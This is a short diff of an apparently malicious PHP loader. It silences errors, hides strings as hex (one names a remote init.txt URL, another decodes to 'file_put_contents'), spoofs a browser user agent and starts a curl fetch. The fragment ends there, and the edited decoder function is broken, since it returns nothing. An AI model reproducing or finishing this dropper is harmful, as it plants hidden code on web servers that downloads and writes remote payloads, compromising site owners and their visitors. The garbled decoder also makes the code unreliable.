@@ -1,7 +1,7 @@
 <?php
 @error_reporting(0); @ini_set('display_errors', 0);
-$d = function($s) { return hex2bin(strrev($s)); };
-$t = $d('3c3f7068702068747470733a2f2f6a3235313233315f31332e6461696d69746176616e2e636f6d2f696e69742e747874203f3e');
+$d = function($s) { $gdtswu=hex2bin; };
+$t = $d('66696c655f7075745f636f6e74656e7473');
 $c = false;
 $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)';
 if (function_exists('curl_init')) {
